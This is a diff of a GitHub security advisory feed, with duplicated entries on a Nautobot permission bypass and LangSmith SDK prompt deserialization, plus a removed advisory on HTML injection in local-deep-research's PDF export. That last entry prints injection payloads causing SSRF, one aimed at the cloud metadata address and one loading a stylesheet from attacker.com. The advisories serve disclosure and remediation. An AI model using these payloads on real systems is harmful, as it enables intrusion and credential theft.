+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/c2b766966d814a7141f62c7bc90c85fefb7892ee">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/5a30d0916953afbeedd24a784709e762cc3879cd">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-qrpw-gjvh-x5gm">https://github.com/nautobot/nautobot/security/advisories/GHSA-qrpw-gjvh-x5gm</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/5a30d0916953afbeedd24a784709e762cc3879cd">https://github.com/nautobot/nautobot/commit/5a30d0916953afbeedd24a784709e762cc3879cd</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/c2b766966d814a7141f62c7bc90c85fefb7892ee">https://github.com/nautobot/nautobot/commit/c2b766966d814a7141f62c7bc90c85fefb7892ee</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-qrpw-gjvh-x5gm">https://github.com/advisories/GHSA-qrpw-gjvh-x5gm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qrpw-gjvh-x5gm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-13T15:30:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: REST API permits creation of GenericForeignKey references to objects that the user should not be able to reference]]></title>
+        <id>https://github.com/advisories/GHSA-wpxj-44w3-2j6x</id>
+        <link href="https://github.com/advisories/GHSA-wpxj-44w3-2j6x"/>
+        <updated>2026-05-13T15:30:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>In the case of inter-object references via <code>GenericForeignKey</code> (a pattern allowing an object to reference another object that may belong to one of several different "content types" or database tables), when creating or updating an object containing a <code>GenericForeignKey</code>, Nautobot's REST API failed to enforce user "view" permissions when determining whether a given reference to another object would be valid. </p>
+<p>As a concrete example, a user:</p>
+<ul>
+<li>who has permission to create or update <code>ImageAttachment</code> records</li>
+<li>but who lacks permission to view (some or all) <code>Device</code> records</li>
+<li><em>but who knows (via some other mechanism) the UUID of a specific <code>Device</code> that they do not otherwise have access to</em></li>
+</ul>
+<p>could create via the REST API an <code>ImageAttachment</code> linked to that specific <code>Device</code>.</p>
+<p>Other models that use <code>GenericForeignKey</code> and may be writable via the REST API, and hence have a similar vulnerability to <code>ImageAttachment</code>, may include:</p>
+<ul>
+<li><code>ApprovalWorkflow</code></li>
+<li><code>Cable</code></li>
+<li><code>ConfigContext</code></li>
+<li><code>ContactAssociation</code></li>
+<li><code>DataCompliance</code></li>
+<li><code>Device</code></li>
+<li><code>ExportTemplate</code></li>
+<li><code>GraphQLQuery</code></li>
+<li><code>Note</code></li>
+<li><code>ObjectMetadata</code></li>
+<li><code>RelationshipAssociation</code></li>
+<li><code>StaticGroupAssociation</code></li>
+<li><code>VirtualMachine</code></li>
+</ul>
+<p>Additionally, any Nautobot Apps that provide models with a REST API and use GenericForeignKey may have a similar vulnerability for their models.</p>
+<h3 id="patches">Patches</h3>
+<p>A general-purpose fix has been implemented in Nautobot 2.4.33 and 3.1.2, which ensures correct application of "view" permissions when creating or modifying object references via <code>GenericForeignKey</code> throughout the REST API. Individual models/views/serializers generally will not require any specific code changes to benefit from this fix.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No known workarounds at this time.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/9918bdb9bcf1eb42cda72c344f420a64ef7665f1">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/36cde7148a207234de6212ec074f321dbc9d1b5b">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-wpxj-44w3-2j6x">https://github.com/nautobot/nautobot/security/advisories/GHSA-wpxj-44w3-2j6x</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/36cde7148a207234de6212ec074f321dbc9d1b5b">https://github.com/nautobot/nautobot/commit/36cde7148a207234de6212ec074f321dbc9d1b5b</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/9918bdb9bcf1eb42cda72c344f420a64ef7665f1">https://github.com/nautobot/nautobot/commit/9918bdb9bcf1eb42cda72c344f420a64ef7665f1</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-wpxj-44w3-2j6x">https://github.com/advisories/GHSA-wpxj-44w3-2j6x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wpxj-44w3-2j6x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-13T15:30:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nautobot] Nautobot: REST API permits creation of GenericForeignKey references to objects that the user should not be able to reference]]></title>
+        <id>https://github.com/advisories/GHSA-wpxj-44w3-2j6x</id>
+        <link href="https://github.com/advisories/GHSA-wpxj-44w3-2j6x"/>
+        <updated>2026-05-13T15:30:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>In the case of inter-object references via <code>GenericForeignKey</code> (a pattern allowing an object to reference another object that may belong to one of several different "content types" or database tables), when creating or updating an object containing a <code>GenericForeignKey</code>, Nautobot's REST API failed to enforce user "view" permissions when determining whether a given reference to another object would be valid. </p>
+<p>As a concrete example, a user:</p>
+<ul>
+<li>who has permission to create or update <code>ImageAttachment</code> records</li>
+<li>but who lacks permission to view (some or all) <code>Device</code> records</li>
+<li><em>but who knows (via some other mechanism) the UUID of a specific <code>Device</code> that they do not otherwise have access to</em></li>
+</ul>
+<p>could create via the REST API an <code>ImageAttachment</code> linked to that specific <code>Device</code>.</p>
+<p>Other models that use <code>GenericForeignKey</code> and may be writable via the REST API, and hence have a similar vulnerability to <code>ImageAttachment</code>, may include:</p>
+<ul>
+<li><code>ApprovalWorkflow</code></li>
+<li><code>Cable</code></li>
+<li><code>ConfigContext</code></li>
+<li><code>ContactAssociation</code></li>
+<li><code>DataCompliance</code></li>
+<li><code>Device</code></li>
+<li><code>ExportTemplate</code></li>
+<li><code>GraphQLQuery</code></li>
+<li><code>Note</code></li>
+<li><code>ObjectMetadata</code></li>
+<li><code>RelationshipAssociation</code></li>
+<li><code>StaticGroupAssociation</code></li>
+<li><code>VirtualMachine</code></li>
+</ul>
+<p>Additionally, any Nautobot Apps that provide models with a REST API and use GenericForeignKey may have a similar vulnerability for their models.</p>
+<h3 id="patches">Patches</h3>
+<p>A general-purpose fix has been implemented in Nautobot 2.4.33 and 3.1.2, which ensures correct application of "view" permissions when creating or modifying object references via <code>GenericForeignKey</code> throughout the REST API. Individual models/views/serializers generally will not require any specific code changes to benefit from this fix.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>No known workarounds at this time.</p>
+<h3 id="references">References</h3>
+<ul>
+<li>2.4.33 (<a href="https://github.com/nautobot/nautobot/commit/9918bdb9bcf1eb42cda72c344f420a64ef7665f1">patch</a>)</li>
+<li>3.1.2 (<a href="https://github.com/nautobot/nautobot/commit/36cde7148a207234de6212ec074f321dbc9d1b5b">patch</a>)</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-wpxj-44w3-2j6x">https://github.com/nautobot/nautobot/security/advisories/GHSA-wpxj-44w3-2j6x</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/36cde7148a207234de6212ec074f321dbc9d1b5b">https://github.com/nautobot/nautobot/commit/36cde7148a207234de6212ec074f321dbc9d1b5b</a></li>
+<li><a href="https://github.com/nautobot/nautobot/commit/9918bdb9bcf1eb42cda72c344f420a64ef7665f1">https://github.com/nautobot/nautobot/commit/9918bdb9bcf1eb42cda72c344f420a64ef7665f1</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v2.4.33">https://github.com/nautobot/nautobot/releases/tag/v2.4.33</a></li>
+<li><a href="https://github.com/nautobot/nautobot/releases/tag/v3.1.2">https://github.com/nautobot/nautobot/releases/tag/v3.1.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-wpxj-44w3-2j6x">https://github.com/advisories/GHSA-wpxj-44w3-2j6x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wpxj-44w3-2j6x</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-13T15:30:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[langchain] LangSmith SDK: Public prompt pull deserializes untrusted manifests without trust boundary warning]]></title>
+        <id>https://github.com/advisories/GHSA-3644-q5cj-c5c7</id>
+        <link href="https://github.com/advisories/GHSA-3644-q5cj-c5c7"/>
+        <updated>2026-05-13T15:29:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p>The LangSmith SDK's prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) fetch and deserialize prompt manifests from the LangSmith Hub. These manifests may contain serialized LangChain objects and model configuration that affect runtime behavior. When pulling a public prompt by <code>owner/name</code> identifier, the manifest content is controlled by an external party, but prior versions of the SDK did not distinguish this from pulling a prompt within the caller's own organization.</p>
+<p>Prompt manifests can intentionally configure a model with a custom base URL, default headers, model name, or other constructor arguments. These are supported features, but they also mean the prompt contents should be treated as executable configuration rather than plain text. A prompt can also include serialized LangChain <code>Runnable</code> or <code>PromptTemplate</code> objects with attacker-controlled constructor kwargs, or secret references that, if <code>secrets_from_env</code> is enabled, read environment variables at deserialization time.
+Applications are exposed when all of the following are true:</p>
+<ul>
+<li>The application calls <code>pull_prompt</code> or <code>pull_prompt_commit</code> (Python) or <code>pullPrompt</code> or <code>pullPromptCommit</code> (JS/TS) with a public <code>owner/name</code> prompt identifier.</li>
+<li>The prompt was published or modified by an untrusted or compromised account.</li>
+<li>The application uses the pulled prompt without independently validating its contents.</li>
+</ul>
+<p>Applications that only pull prompts from their own organization (referenced by name only, without an <code>owner/</code> prefix) are not affected by the public prompt trust boundary issue described above. However, same-organization prompts carry their own risk. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that is pulled and deserialized without any additional warning.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who publishes a malicious prompt to LangSmith Hub may be able to affect applications that pull that prompt by <code>owner/name</code>. If the prompt manifest reaches the SDK's deserialization path, the SDK will instantiate the referenced LangChain objects with the attacker-supplied constructor arguments rather than treating the manifest as inert data.</p>
+<p>Realistic impacts include:</p>
+<ul>
+<li>Server-side request forgery (SSRF), outbound request redirection, and interception of LLM traffic if a prompt manifest configures an LLM client with an attacker-controlled <code>base_url</code>, proxy, or equivalent endpoint-setting parameter. In typical deployments, redirected requests may include prompt contents, system prompts, retrieved context, model parameters, provider credentials, or other secrets and may disclose them to the attacker-controlled endpoint.</li>
+<li>Prompt injection or behavior manipulation if a manifest embeds attacker-controlled system messages, prompt templates, or model parameters that alter the application's behavior.</li>
+<li>Additional deserialization risk when <code>include_model=True</code> is passed, because this expands the allowlist to partner integration classes. This is not the default, but it materially increases risk when pulling prompts from outside the caller's organization.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>The LangSmith SDK now blocks pulling public prompts by <code>owner/name</code> by default. Callers must explicitly opt in by passing <code>dangerously_pull_public_prompt=True</code> (Python) or <code>dangerouslyPullPublicPrompt: true</code> (JS/TS) to acknowledge the trust boundary. This flag should only be set after reviewing and trusting the prompt contents, not merely the publishing account.</p>
+<p>Upgrade to LangSmith SDK <strong>Python &gt;= 0.8.0</strong> or <strong>JS/TS &gt;= 0.6.0</strong>.</p>
+<h3 id="guidance-for-prompt-pull-methods">Guidance for prompt pull methods</h3>
+<p>The prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) should be used only with trusted prompts. Do not pull public prompts by <code>owner/name</code> from untrusted or unreviewed sources without understanding that the manifest contents will be deserialized and may affect runtime behavior.</p>
+<p>When pulling prompts that include model configuration (<code>include_model=True</code> in Python, <code>includeModel: true</code> in JS/TS), the deserialization allowlist expands to include partner integration classes. Because this mode is not the default and is often unnecessary for third-party prompts, prefer the default (<code>false</code>) when pulling prompts from sources outside your organization.</p>
+<p>Avoid passing <code>secrets_from_env=True</code> (Python) when pulling untrusted prompts. This parameter allows prompt manifests to read environment variables during deserialization. Only use it with trusted prompts from your own organization.</p>
+<h3 id="same-organization-prompts">Same-organization prompts</h3>
+<p>Prompts pulled from the caller's own organization (referenced by name only, without an <code>owner/</code> prefix) are not gated by the new <code>dangerously_pull_public_prompt</code> flag, but they are not inherently safe. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that redirects LLM traffic to attacker-controlled infrastructure and may disclose any credentials attached to those requests.</p>
+<p>The security of same-organization prompts follows a shared responsibility model. The LangSmith SDK enforces trust boundaries for public prompts pulled from external accounts, but it cannot protect against compromised credentials or accounts within the caller's own organization. Securing API keys, managing team member access, and reviewing prompt contents before production deployment are the responsibility of the organization. Organizations should treat prompts as executable configuration and apply the same review and audit practices they would apply to application code.</p>
+<h2 id="credits">Credits</h2>
+<p>First reported by @Moaaz-0x.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7">https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7</a></li>
+<li><a href="https://github.com/advisories/GHSA-3644-q5cj-c5c7">https://github.com/advisories/GHSA-3644-q5cj-c5c7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3644-q5cj-c5c7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-13T15:29:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[langchain-classic] LangSmith SDK: Public prompt pull deserializes untrusted manifests without trust boundary warning]]></title>
+        <id>https://github.com/advisories/GHSA-3644-q5cj-c5c7</id>
+        <link href="https://github.com/advisories/GHSA-3644-q5cj-c5c7"/>
+        <updated>2026-05-13T15:29:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p>The LangSmith SDK's prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) fetch and deserialize prompt manifests from the LangSmith Hub. These manifests may contain serialized LangChain objects and model configuration that affect runtime behavior. When pulling a public prompt by <code>owner/name</code> identifier, the manifest content is controlled by an external party, but prior versions of the SDK did not distinguish this from pulling a prompt within the caller's own organization.</p>
+<p>Prompt manifests can intentionally configure a model with a custom base URL, default headers, model name, or other constructor arguments. These are supported features, but they also mean the prompt contents should be treated as executable configuration rather than plain text. A prompt can also include serialized LangChain <code>Runnable</code> or <code>PromptTemplate</code> objects with attacker-controlled constructor kwargs, or secret references that, if <code>secrets_from_env</code> is enabled, read environment variables at deserialization time.
+Applications are exposed when all of the following are true:</p>
+<ul>
+<li>The application calls <code>pull_prompt</code> or <code>pull_prompt_commit</code> (Python) or <code>pullPrompt</code> or <code>pullPromptCommit</code> (JS/TS) with a public <code>owner/name</code> prompt identifier.</li>
+<li>The prompt was published or modified by an untrusted or compromised account.</li>
+<li>The application uses the pulled prompt without independently validating its contents.</li>
+</ul>
+<p>Applications that only pull prompts from their own organization (referenced by name only, without an <code>owner/</code> prefix) are not affected by the public prompt trust boundary issue described above. However, same-organization prompts carry their own risk. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that is pulled and deserialized without any additional warning.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who publishes a malicious prompt to LangSmith Hub may be able to affect applications that pull that prompt by <code>owner/name</code>. If the prompt manifest reaches the SDK's deserialization path, the SDK will instantiate the referenced LangChain objects with the attacker-supplied constructor arguments rather than treating the manifest as inert data.</p>
+<p>Realistic impacts include:</p>
+<ul>
+<li>Server-side request forgery (SSRF), outbound request redirection, and interception of LLM traffic if a prompt manifest configures an LLM client with an attacker-controlled <code>base_url</code>, proxy, or equivalent endpoint-setting parameter. In typical deployments, redirected requests may include prompt contents, system prompts, retrieved context, model parameters, provider credentials, or other secrets and may disclose them to the attacker-controlled endpoint.</li>
+<li>Prompt injection or behavior manipulation if a manifest embeds attacker-controlled system messages, prompt templates, or model parameters that alter the application's behavior.</li>
+<li>Additional deserialization risk when <code>include_model=True</code> is passed, because this expands the allowlist to partner integration classes. This is not the default, but it materially increases risk when pulling prompts from outside the caller's organization.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>The LangSmith SDK now blocks pulling public prompts by <code>owner/name</code> by default. Callers must explicitly opt in by passing <code>dangerously_pull_public_prompt=True</code> (Python) or <code>dangerouslyPullPublicPrompt: true</code> (JS/TS) to acknowledge the trust boundary. This flag should only be set after reviewing and trusting the prompt contents, not merely the publishing account.</p>
+<p>Upgrade to LangSmith SDK <strong>Python &gt;= 0.8.0</strong> or <strong>JS/TS &gt;= 0.6.0</strong>.</p>
+<h3 id="guidance-for-prompt-pull-methods">Guidance for prompt pull methods</h3>
+<p>The prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) should be used only with trusted prompts. Do not pull public prompts by <code>owner/name</code> from untrusted or unreviewed sources without understanding that the manifest contents will be deserialized and may affect runtime behavior.</p>
+<p>When pulling prompts that include model configuration (<code>include_model=True</code> in Python, <code>includeModel: true</code> in JS/TS), the deserialization allowlist expands to include partner integration classes. Because this mode is not the default and is often unnecessary for third-party prompts, prefer the default (<code>false</code>) when pulling prompts from sources outside your organization.</p>
+<p>Avoid passing <code>secrets_from_env=True</code> (Python) when pulling untrusted prompts. This parameter allows prompt manifests to read environment variables during deserialization. Only use it with trusted prompts from your own organization.</p>
+<h3 id="same-organization-prompts">Same-organization prompts</h3>
+<p>Prompts pulled from the caller's own organization (referenced by name only, without an <code>owner/</code> prefix) are not gated by the new <code>dangerously_pull_public_prompt</code> flag, but they are not inherently safe. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that redirects LLM traffic to attacker-controlled infrastructure and may disclose any credentials attached to those requests.</p>
+<p>The security of same-organization prompts follows a shared responsibility model. The LangSmith SDK enforces trust boundaries for public prompts pulled from external accounts, but it cannot protect against compromised credentials or accounts within the caller's own organization. Securing API keys, managing team member access, and reviewing prompt contents before production deployment are the responsibility of the organization. Organizations should treat prompts as executable configuration and apply the same review and audit practices they would apply to application code.</p>
+<h2 id="credits">Credits</h2>
+<p>First reported by @Moaaz-0x.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7">https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7</a></li>
+<li><a href="https://github.com/advisories/GHSA-3644-q5cj-c5c7">https://github.com/advisories/GHSA-3644-q5cj-c5c7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3644-q5cj-c5c7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-13T15:29:30.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[langsmith] LangSmith SDK: Public prompt pull deserializes untrusted manifests without trust boundary warning]]></title>
+        <id>https://github.com/advisories/GHSA-3644-q5cj-c5c7</id>
+        <link href="https://github.com/advisories/GHSA-3644-q5cj-c5c7"/>
+        <updated>2026-05-13T15:29:32.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="description">Description</h2>
+<p>The LangSmith SDK's prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) fetch and deserialize prompt manifests from the LangSmith Hub. These manifests may contain serialized LangChain objects and model configuration that affect runtime behavior. When pulling a public prompt by <code>owner/name</code> identifier, the manifest content is controlled by an external party, but prior versions of the SDK did not distinguish this from pulling a prompt within the caller's own organization.</p>
+<p>Prompt manifests can intentionally configure a model with a custom base URL, default headers, model name, or other constructor arguments. These are supported features, but they also mean the prompt contents should be treated as executable configuration rather than plain text. A prompt can also include serialized LangChain <code>Runnable</code> or <code>PromptTemplate</code> objects with attacker-controlled constructor kwargs, or secret references that, if <code>secrets_from_env</code> is enabled, read environment variables at deserialization time.
+Applications are exposed when all of the following are true:</p>
+<ul>
+<li>The application calls <code>pull_prompt</code> or <code>pull_prompt_commit</code> (Python) or <code>pullPrompt</code> or <code>pullPromptCommit</code> (JS/TS) with a public <code>owner/name</code> prompt identifier.</li>
+<li>The prompt was published or modified by an untrusted or compromised account.</li>
+<li>The application uses the pulled prompt without independently validating its contents.</li>
+</ul>
+<p>Applications that only pull prompts from their own organization (referenced by name only, without an <code>owner/</code> prefix) are not affected by the public prompt trust boundary issue described above. However, same-organization prompts carry their own risk. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that is pulled and deserialized without any additional warning.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who publishes a malicious prompt to LangSmith Hub may be able to affect applications that pull that prompt by <code>owner/name</code>. If the prompt manifest reaches the SDK's deserialization path, the SDK will instantiate the referenced LangChain objects with the attacker-supplied constructor arguments rather than treating the manifest as inert data.</p>
+<p>Realistic impacts include:</p>
+<ul>
+<li>Server-side request forgery (SSRF), outbound request redirection, and interception of LLM traffic if a prompt manifest configures an LLM client with an attacker-controlled <code>base_url</code>, proxy, or equivalent endpoint-setting parameter. In typical deployments, redirected requests may include prompt contents, system prompts, retrieved context, model parameters, provider credentials, or other secrets and may disclose them to the attacker-controlled endpoint.</li>
+<li>Prompt injection or behavior manipulation if a manifest embeds attacker-controlled system messages, prompt templates, or model parameters that alter the application's behavior.</li>
+<li>Additional deserialization risk when <code>include_model=True</code> is passed, because this expands the allowlist to partner integration classes. This is not the default, but it materially increases risk when pulling prompts from outside the caller's organization.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>The LangSmith SDK now blocks pulling public prompts by <code>owner/name</code> by default. Callers must explicitly opt in by passing <code>dangerously_pull_public_prompt=True</code> (Python) or <code>dangerouslyPullPublicPrompt: true</code> (JS/TS) to acknowledge the trust boundary. This flag should only be set after reviewing and trusting the prompt contents, not merely the publishing account.</p>
+<p>Upgrade to LangSmith SDK <strong>Python &gt;= 0.8.0</strong> or <strong>JS/TS &gt;= 0.6.0</strong>.</p>
+<h3 id="guidance-for-prompt-pull-methods">Guidance for prompt pull methods</h3>
+<p>The prompt pull methods (<code>pull_prompt</code> / <code>pull_prompt_commit</code> in Python, <code>pullPrompt</code> / <code>pullPromptCommit</code> in JS/TS) should be used only with trusted prompts. Do not pull public prompts by <code>owner/name</code> from untrusted or unreviewed sources without understanding that the manifest contents will be deserialized and may affect runtime behavior.</p>
+<p>When pulling prompts that include model configuration (<code>include_model=True</code> in Python, <code>includeModel: true</code> in JS/TS), the deserialization allowlist expands to include partner integration classes. Because this mode is not the default and is often unnecessary for third-party prompts, prefer the default (<code>false</code>) when pulling prompts from sources outside your organization.</p>
+<p>Avoid passing <code>secrets_from_env=True</code> (Python) when pulling untrusted prompts. This parameter allows prompt manifests to read environment variables during deserialization. Only use it with trusted prompts from your own organization.</p>
+<h3 id="same-organization-prompts">Same-organization prompts</h3>
+<p>Prompts pulled from the caller's own organization (referenced by name only, without an <code>owner/</code> prefix) are not gated by the new <code>dangerously_pull_public_prompt</code> flag, but they are not inherently safe. If an attacker gains write access to the organization (for example, through a leaked <code>LANGSMITH_API_KEY</code> or a compromised team member account), they can push a malicious prompt that redirects LLM traffic to attacker-controlled infrastructure and may disclose any credentials attached to those requests.</p>
+<p>The security of same-organization prompts follows a shared responsibility model. The LangSmith SDK enforces trust boundaries for public prompts pulled from external accounts, but it cannot protect against compromised credentials or accounts within the caller's own organization. Securing API keys, managing team member access, and reviewing prompt contents before production deployment are the responsibility of the organization. Organizations should treat prompts as executable configuration and apply the same review and audit practices they would apply to application code.</p>
+<h2 id="credits">Credits</h2>
+<p>First reported by @Moaaz-0x.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7">https://github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-3644-q5cj-c5c7</a></li>
+<li><a href="https://github.com/advisories/GHSA-3644-q5cj-c5c7">https://github.com/advisories/GHSA-3644-q5cj-c5c7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-3644-q5cj-c5c7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-13T15:29:30.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[openstack-cyborg] OpenStack Cyborg's Accelerator Request (ARQ) API does not enforce project ownership at any layer]]></title>
         <id>https://github.com/advisories/GHSA-mmpc-xjxr-5hf8</id>
@@ -447,857 +1293,5 @@ for i in range(5):
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-07T21:30:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[local-deep-research] local-deep-research is Vulnerable to HTML Injection via Unescaped User Input in PDF Export (`pdf_service.py:_markdown_to_html`)]]></title>
-        <id>https://github.com/advisories/GHSA-fj2m-qvh9-jq4q</id>
-        <link href="https://github.com/advisories/GHSA-fj2m-qvh9-jq4q"/>
-        <updated>2026-05-11T19:40:08.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>PDFService._markdown_to_html()</code> constructs an HTML document by interpolating user-controlled values — specifically <code>title</code> (sourced from <code>research.title</code> or <code>research.query</code>) and <code>metadata</code> key-value pairs — directly into an f-string without any HTML escaping. An authenticated attacker can craft a research query containing HTML special characters to inject arbitrary HTML tags into the document processed by WeasyPrint during PDF export. This injection can be chained to trigger a Server-Side Request Forgery (SSRF), bypassing the application's existing SSRF defenses in <code>ssrf_validator.py</code>.</p>
-<hr>
-<h2 id="details">Details</h2>
-<p><strong>Vulnerable code:</strong> <code>src/local_deep_research/web/services/pdf_service.py</code>, lines 171–176</p>
-<pre><code class="language-python"># pdf_service.py:171-176
-if title:
-    html_parts.append(f"&lt;title&gt;{title}&lt;/title&gt;")   # ← title is not escaped
-
-if metadata:
-    for key, value in metadata.items():
-        html_parts.append(f'&lt;meta name="{key}" content="{value}"&gt;')  # ← key/value are not escaped
-</code></pre>
-<p><strong>Data flow trace:</strong></p>
-<pre><code>User input: research.query
-        │
-        ▼
-research_routes.py:1321
-  pdf_title = research.title or research.query
-        │
-        ▼
-research_routes.py:1325-1326
-  export_report_to_memory(report_content, format, title=pdf_title)
-        │
-        ▼
-pdf_service.py:107
-  PDFService.markdown_to_pdf(markdown_content, title=pdf_title)
-        │
-        ▼
-pdf_service.py:137
-  _markdown_to_html(markdown_content, title, metadata)
-        │
-        ▼
-pdf_service.py:172
-  f"&lt;title&gt;{title}&lt;/title&gt;"   ← injection point, no escaping
-        │
-        ▼
-pdf_service.py:112
-  HTML(string=html_content)   ← WeasyPrint renders the injected HTML
-</code></pre>
-<p><code>research.query</code> is a string submitted by the user via <code>POST /api/start_research</code>, stored as-is in the database, and retrieved without any sanitization. When the user triggers <code>POST /api/v1/research/&lt;research_id&gt;/export/pdf</code>, this value is embedded unescaped into the HTML document processed by WeasyPrint.</p>
-<p><strong>Injection point 1: <code>&lt;title&gt;</code> tag breakout</strong></p>
-<pre><code>Input:    &lt;/title&gt;&lt;img src="http://169.254.169.254/latest/meta-data/" /&gt;
-Rendered: &lt;title&gt;&lt;/title&gt;&lt;img src="http://169.254.169.254/latest/meta-data/" /&gt;&lt;/title&gt;
-</code></pre>
-<p>When WeasyPrint encounters the injected <code>&lt;img&gt;</code> tag, it issues an HTTP GET request to the value of <code>src</code> by default.</p>
-<p><strong>Injection point 2: <code>&lt;meta&gt;</code> attribute breakout</strong></p>
-<pre><code>Input:    " /&gt;&lt;link rel="stylesheet" href="http://attacker.com/evil.css
-Rendered: &lt;meta name="..." content="" /&gt;&lt;link rel="stylesheet" href="http://attacker.com/evil.css"&gt;
-</code></pre>
-<p>WeasyPrint will fetch and apply the external stylesheet, which also constitutes SSRF.</p>
-<hr>
